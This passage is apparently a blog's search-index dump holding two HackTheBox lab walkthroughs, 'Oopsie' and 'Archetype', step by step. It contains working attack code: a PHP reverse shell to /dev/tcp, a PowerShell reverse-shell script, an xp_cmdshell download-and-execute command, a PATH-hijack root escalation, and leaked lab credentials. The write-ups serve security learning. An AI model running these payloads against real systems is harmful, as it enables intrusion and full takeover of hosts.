using Burpsuite Intruder led to nothing. Unfortunately, the password is not included in a standard wordlist like rockyou.txt. After being stuck in the login panel, I searched the Internet. It turns out that it’s a reused credential from the previous machine “Archetype”.The credentials in question are:username: adminpassword: MEGACORP_4dm1n!!After logging in, we land on a page which says it is a Repair Management System:We have access to the account information of the admin. An important thing we should notice here is the id=1 form the request in the address bar. Possibly there is an account enumeration.On the other pages, we have information about the Branding, as well as information about clients. But the Uploads page we can’t access because we don’t have sufficient permissions to access it: super admins rights needed.It looks like there is an account with more access. Let’s try to find it.FootholdGoing back to the account information page, as mentioned above. The id parameter of the URL, id 1 seems to be the Admin.Can we get information about the super admin user if we can guess his id? Let’s try using the following python script:#!/bin/python3import requestsimport signalimport threadingimport loggingimport sysdef def_handler(sig, frame): print(\"\\n[!] Stopping the process...\\n\") sys.exit(1)# Ctrl+Csignal.signal(signal.SIGINT, def_handler)# Global variableslogin_url = \"http://10.10.10.28/cdn-cgi/login/index.php\"accounts_url = \"http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=\"def makeRequest(): s = requests.session() post_data = { 'username': 'admin', 'password': 'MEGACORP_4dm1n!!' } p = s.post(login_url, data=post_data) for x in range(100): print(f\"[+] Testing id: {x}\") r = s.get(accounts_url + str(x)) if 'super' in r.text: print(f\"[+] Super admin id found: {x}\") breakif __name__ == '__main__': try: threading.Thread(target=makeRequest, args=()).start() except Exception as e: logging.error(str(e))Running the code, we see that super admin id is 30, as the response contains the word super.Unique cookies are the user and role tokens. Changing the cookie accordingly (user: 86575, role: super admin) we can access the Uploads page.Getting complete control (RCE)It’s possible that the developer forgot to implement user input validation, so we should test if we can upload other files, such as a PHP web shell.Trying to upload the following PHP reverse shell (shell.php) succeeds:&lt;?php exec(\"/bin/bash -c 'bash -i &amp;&gt; /dev/tcp/YOUR_IP/443 0&lt;&amp;1'\")?&gt;During our sitemap-enumeration with Wfuzz, we found a directory called /uploads. It probably contains the uploaded file.Starting a listener on port 443 with:$ nc -lvnp 443Parameters explanation: l: Listen for connections. v: Set verbosity level (can be used several times). n: Do not resolve hostnames via DNS. p: Specify source port to use.Accessing the file on 10.10.10.28/uploads/shell.php, gives us a reverse shell to the machine. The first step is always stabilizing the shell so we can’t accidentally close the connection if we press something like CTRL+C.$ script /dev/null -c bashCTRL + Z (nc process into the background)$ stty raw -echo; fg$ reset$ xterm$ export TERM=xterm$ export SHELL=bashNow we should have a fully stabilized shell.On-Machine Enumerationwww-data@oopsie:/var/www/html/uploads$ cd /homewww-data@oopsie:/home$ ls robertInspecting the home directories, we can see the user robert.www-data@oopsie:/home$ cd robertwww-data@oopsie:/home/robert$ ls -ltotal 4-rw-r--r-- 1 robert robert 33 Feb 25 2020 user.txtuser.txtHis home directory contains the user.txt flag, and we have privileges to read it. The next step is to get root access and read the root flag!Privilege EscalationAfter a bit of searching common directories, there is an interesting file called db.php inside the webpage directory tree:www-data@oopsie:/var/www/html/cdn-cgi/login$ lsadmin.php db.php index.php script.jswww-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php&lt;?php$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');?&gt;As it turns out, we can use these credentials to connect to the machine over SSH. Let’s migrate to user robert with the password M3g4C0rpUs3r!.www-data@oopsie:/var/www/html/cdn-cgi/login$ su robertPassword:robert@oopsie:/var/www/html/cdn-cgi/login$ cdrobert@oopsie:~$ whoamirobertLet’s find more information about user “robert” using the id command:robert@oopsie:~$ iduid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)robert@oopsie:~$ find / -group bugtracker 2&gt;/dev/null/usr/bin/bugtrackerRobert is a member of the bugtracker group, so we can now further investigate the bugtracker binary.Running the binary with input 1 outputs the following:robert@oopsie:~$ bugtracker------------------: EV Bug Tracker :------------------Provide Bug ID: 1---------------Binary package hint: ev-engine-libVersion: 3.3.3-1Reproduce:When loading library in firmware it seems to be crashedWhat you expected to happen:Synchronized browsing to be enabled since it is enabled for that site.What happened instead:Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.It seems to output a report based on the ID value provided. Let’s try different inputs:robert@oopsie:~$ bugtracker------------------: EV Bug Tracker :------------------Provide Bug ID: hello---------------cat: /root/reports/hello: No such file or directory It calls the cat binary using this relative path instead of the absolute one.By creating a malicious cat and modifying the route to include the current working directory, we should be able to abuse this misconfiguration and escalate our privileges to root. Let’s try it:export PATH=/tmp:$PATHcd /tmpecho '/bin/sh' &gt; catchmod +x catrobert@oopsie:/tmp$ bugtracker------------------: EV Bug Tracker :------------------Provide Bug ID: 1---------------# whoamiroot# cd /root# lsreports root.txtThat’s it, Oopsie has been Pwned!Post ExplotationInside the root’s folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser / mc@F1l3ZilL4 visible in plain text.root@oopsie:~# cat ./.config/filezilla/filezilla.xml&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\" ?&gt;&lt;FileZilla3&gt; &lt;RecentServers&gt; &lt;Server&gt; &lt;Host&gt;10.10.10.46&lt;/Host&gt; &lt;Port&gt;21&lt;/Port&gt; &lt;Protocol&gt;0&lt;/Protocol&gt; &lt;Type&gt;0&lt;/Type&gt; &lt;User&gt;ftpuser&lt;/User&gt; &lt;Pass&gt;mc@F1l3ZilL4&lt;/Pass&gt; &lt;Logontype&gt;1&lt;/Logontype&gt; &lt;TimezoneOffset&gt;0&lt;/TimezoneOffset&gt; &lt;PasvMode&gt;MODE_DEFAULT&lt;/PasvMode&gt; &lt;MaximumMultipleConnections&gt;0&lt;/MaximumMultipleConnections&gt; &lt;EncodingType&gt;Auto&lt;/EncodingType&gt; &lt;BypassProxy&gt;0&lt;/BypassProxy&gt; &lt;/Server&gt; &lt;/RecentServers&gt;&lt;/FileZilla3&gt;" }, { "title": "HackTheBox write-up: Archetype", "url": "/posts/HTB-Archetype/", "categories": "Starting Point, Windows", "tags": "Very Easy, SMB, SQL, RCE", "date": "2021-09-01 20:48:00 +0200", "snippet": "This is a write-up for the Archetype machine on HackTheBox. It belonged to the “Starting Point” series.Basic InformationMachine IP: 10.10.10.27 Type: Windows Difficulty: Very EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.10.27Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.$ nmap -p- --open -T5 -v -n 10.10.10.27Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 08:41 CESTHappy 24th Birthday to Nmap, may it live to be 124!Initiating Ping Scan at 08:41Scanning 10.10.10.27 [4 ports]Completed Ping Scan at 08:41, 0.04s elapsed (1 total hosts)Initiating SYN Stealth Scan at 08:41Scanning 10.10.10.27 [65535 ports]Discovered open port 445/tcp on 10.10.10.27Discovered open port 135/tcp on 10.10.10.27Discovered open port 139/tcp on 10.10.10.27Discovered open port 5985/tcp on 10.10.10.27Discovered open port 49665/tcp on 10.10.10.27Discovered open port 49666/tcp on 10.10.10.27Discovered open port 49664/tcp on 10.10.10.27Discovered open port 47001/tcp on 10.10.10.27Discovered open port 1433/tcp on 10.10.10.27Discovered open port 49669/tcp on 10.10.10.27Discovered open port 49668/tcp on 10.10.10.27Discovered open port 49667/tcp on 10.10.10.27Completed SYN Stealth Scan at 08:41, 12.96s elapsed (65535 total ports)Nmap scan report for 10.10.10.27Host is up (0.050s latency).Not shown: 65453 closed ports, 70 filtered portsSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds1433/tcp open ms-sql-s5985/tcp open wsman47001/tcp open winrm49664/tcp open unknown49665/tcp open unknown49666/tcp open unknown49667/tcp open unknown49668/tcp open unknown49669/tcp open unknownRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 13.07 seconds Raw packets sent: 69185 (3.044MB) | Rcvd: 66644 (2.666MB)We see some interesting ports like 139/445 and 1433.EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sV -sC -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.27Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sV -sC -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.27Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 08:51 CESTNmap scan report for 10.10.10.27Host is up (0.092s latency).PORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM| ms-sql-ntlm-info:| Target_Name: ARCHETYPE| NetBIOS_Domain_Name: ARCHETYPE| NetBIOS_Computer_Name: ARCHETYPE| DNS_Domain_Name: Archetype| DNS_Computer_Name: Archetype|_ Product_Version: 10.0.17763| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2021-09-01T06:38:41|_Not valid after: 2051-09-01T06:38:41|_ssl-date: 2021-09-01T07:11:27+00:00; +19m15s from scanner time.5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPCService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 1h43m15s, deviation: 3h07m51s, median: 19m14s| ms-sql-info:| 10.10.10.27:1433:| Version:| name: Microsoft SQL Server 2017 RTM| number: 14.00.1000.00| Product: Microsoft SQL Server 2017| Service pack level: RTM| Post-SP patches applied: false|_ TCP port: 1433| smb-os-discovery:| OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)| Computer name: Archetype| NetBIOS computer name: ARCHETYPE\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-09-01T00:11:19-07:00| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 2.02:|_ Message signing enabled but not required| smb2-time:| date: 2021-09-01T07:11:20|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 67.83 secondsSo, on port 139, a NetBIOS session service is running. The service facilitates authentication across a Windows workgroup or domain and provides access to resources (such as files and printers).Port 445 is used for Server Message Block, the internet standard protocol Windows uses to share files, printers, serial ports, etc.Port 1433 runs SQL server, meaning some database is running on the server.Vulnerability Analysis &amp; ExploitationSince the SMB protocol is used to share files, we can try to connect anonymously in search of exciting files. Kali comes with a preinstalled tool called smbmap which enables us to look at the exposed shared resources and their permissions:$ smbmap -H 10.10.10.27 -u \" \" -p \" \"[+] Guest session IP: 10.10.10.27:445 Name: 10.10.10.27 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin backups READ ONLY C$ NO ACCESS Default share IPC$ READ ONLY Remote IPCWe have read access in: backups: It is the only non-default share and lacks a comment, which could contain interesting data. IPC$: This hidden share is a special share used for inter-process communication. Allows one to communicate with processes running on the remote system. Digging into SMB using smbclient, we get a connect on backups shares without auth.$ smbclient //10.10.10.27/backupsEnter WORKGROUP\\root password:Try \"help\" to get a list of possible commands.smb: \\&gt; dir . D 0 Mon Jan 20 13:20:57 2020 .. D 0 Mon Jan 20 13:20:57 2020 prod.dtsConfig AR 609 Mon Jan 20 13:23:02 2020 10328063 blocks of size 4096. 8259491 blocks availablesmb: \\&gt; get prod.dtsConfiggetting file \\prod.dtsConfig of size 609 as prod.dtsConfig (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)smb: \\&gt; exitWe have a file called prod.dtsConfig in that share. Files with a .dtsConfig extensions are XML syntax configuration files used to apply property values to SQL Server Integration Services (SSIS) packages.Using get &lt;FILENAME&gt;, we can download the file to our local machine.On our local machine, we can use the command cat prod.dtsConfig to show the content.&lt;DTSConfiguration&gt; &lt;DTSConfigurationHeading&gt; &lt;DTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/&gt; &lt;/DTSConfigurationHeading&gt; &lt;Configuration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\"&gt; &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt; &lt;/Configuration&gt;&lt;/DTSConfiguration&gt;It looks like there’s a SQL user and password in there!user: ARCHETYPE\\sql_svcpass: M3g4c0rp123FootholdWe see it contains a SQL connection string containing credentials for the local Windows user ARCHETYPE\\sql_svc.Let’s try connecting to the SQL Server using Impacket’s msqliclient.py.$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)[!] Press help for extra shell commandsSQL&gt;We now have a server connection! Now we can use the IS_SRVROLEMEMBER function to check whether the current SQL user has sysadmin (highest level) privileges on the SQL Server.The syntax of the function is:IS_SRVROLEMEMBER ( 'role' [ , 'login' ] )In which we have two arguments: role: We indicate the role, which may be one of the following. sysadmin serveradmin dbcreator setupadmin bulkadmin securityadmin diskadmin public processadmin login: Name of the SQL Server.In our SQL Server session, we will use the following command:SQL&gt; SELECT IS_SRVROLEMEMBER('sysadmin')If the statement (the query) is true we receive no output, if it’s false we get “NULL” as an output.This outputs:----------- 1The user belongs to the system administrators, meaning we have the database’s highest privileges.We have administrator permissions, so we can use some SQL server configuration tools to enable a remote connection. To start with, we will use sp_configure to modify some global server settings.Its syntax is as follows:sp_configure [ @configname = ] 'hadoop connectivity', [ @configvalue = ] { 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 }Arguments: [ @configname= ] ‘option_name’: Is the name of a configuration option. option_name is varchar(35), with a default of NULL. [ @configvalue= ] ‘value’: Is the new configuration setting. value is int, with a default of NULL.Once we have changed some configuration, it is necessary to use reconfigure; to apply the changes.Running the following command:SQL&gt; EXEC sp_configure 'Show Advanced Options', 1;SQL&gt; reconfigure;Using the option_name ‘Show Advanced Options’, we observe a configuration called xp_cmdshell which spawns a Windows command shell and passes in a string for execution.SQL&gt; EXEC sp_configure 'xp_cmdshell', 1;SQL&gt; reconfigure;To check if it works, we can try to execute a command.SQL&gt; xp_cmdshell \"whoami\"This outputs:output--------------------------------------------------------------------------------archetype\\sql_svcNULLWe can see that the user archetype\\sql_svc is displayed again; this means that SQL Server runs with that user inside Windows. NULL appears, which means he doesn’t have administrator permissions.To gain a reverse shell, we will use the following code:$client = New-Object System.Net.Sockets.TCPClient(\"10.10.16.14\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + \"# \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};$client.Close()We save the above code in a file shell.ps1 on our local machine. Remember to put your IP address.Getting complete control (RCE)Now we have to transfer the PowerShell script onto the server somehow.For this, we will start a python web server in one window using the following command:$ python3 -m http.server 80This command will start a webserver in your current working directory.In another window, we spawn a Netcat listener listening on port 443:$ nc -nlvp 443 Depending on your firewall, you might need to add a rule so that the server can connect to your local machine.$ ufw allow from 10.10.10.27 proto tcp to any port 80,443Now, let’s go back to our SQL terminal; we will use the xp_cmdshell tool we used previously. We will invoke a connection to our local HTTP server that allows us to download the reverse shell (shell.ps1) and execute it.The command is:$ xp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.16.14/shell.ps1\\\");\"A shell is received as sql_svc, and we can get the user.txt flag on their desktop.$ nc -nlvp 443Ncat: Version 7.91 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443Ncat: Connection from 10.10.10.27.Ncat: Connection from 10.10.10.27:49694.whoamiarchetype\\sql_svc$ pwdPath----C:\\Windows\\system32$ cd C:\\Users\\sql_svc\\Desktop$ dir Directory: C:\\Users\\sql_svc\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 2/25/2020 6:37 AM 32 user.txtPrivilege EscalationWe already got the user-level flag. Now let’s get the admin flag level.Unfortunately, sql_svc is a standard user account without administrative permissions, meaning we have to do privilege escalation before obtaining the system flag.Doing a recursive search for “admin” from C:\\Users\\sql_svc we obtain a PowerShell history file.dir -Force -recurse *.* | sls -pattern \"admin\" | select -unique pathWe get the following path:C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtAs this is a regular user account and a service account, it is worth checking that history file.cat C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txtThis outputs:net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!This means that the backup share got mounted locally and assigned the drive letter T using the administrator account.To connect, we will use a version of PsExec included in impacket.$ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27This outputs:$ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationPassword:[*] Requesting shares on 10.10.10.27.....[*] Found writable share ADMIN[*] Uploading file GBStfHSI.exe[*] Opening SVCManager on 10.10.10.27.....[*] Creating service jLDP on 10.10.10.27.....[*] Starting service jLDP.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;Checking permissions:C:\\Windows\\system32&gt; whoamint authority\\systemWe now escalated our permissions from a default user to root. We can access the flag on the administrator desktop.C:\\Windows\\system32&gt; cd C:\\Users\\Administrator\\DesktopC:\\Users\\Administrator\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is CE13-2325 Directory of C:\\Users\\Administrator\\Desktop01/20/2020 06:42 AM &lt;DIR&gt; .01/20/2020 06:42 AM &lt;DIR&gt; ..02/25/2020 07:36 AM 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 33,827,815,424 bytes freeC:\\Users\\Administrator\\Desktop&gt; type root.txtThat’s it; Archetype has been Pwned!" } ]
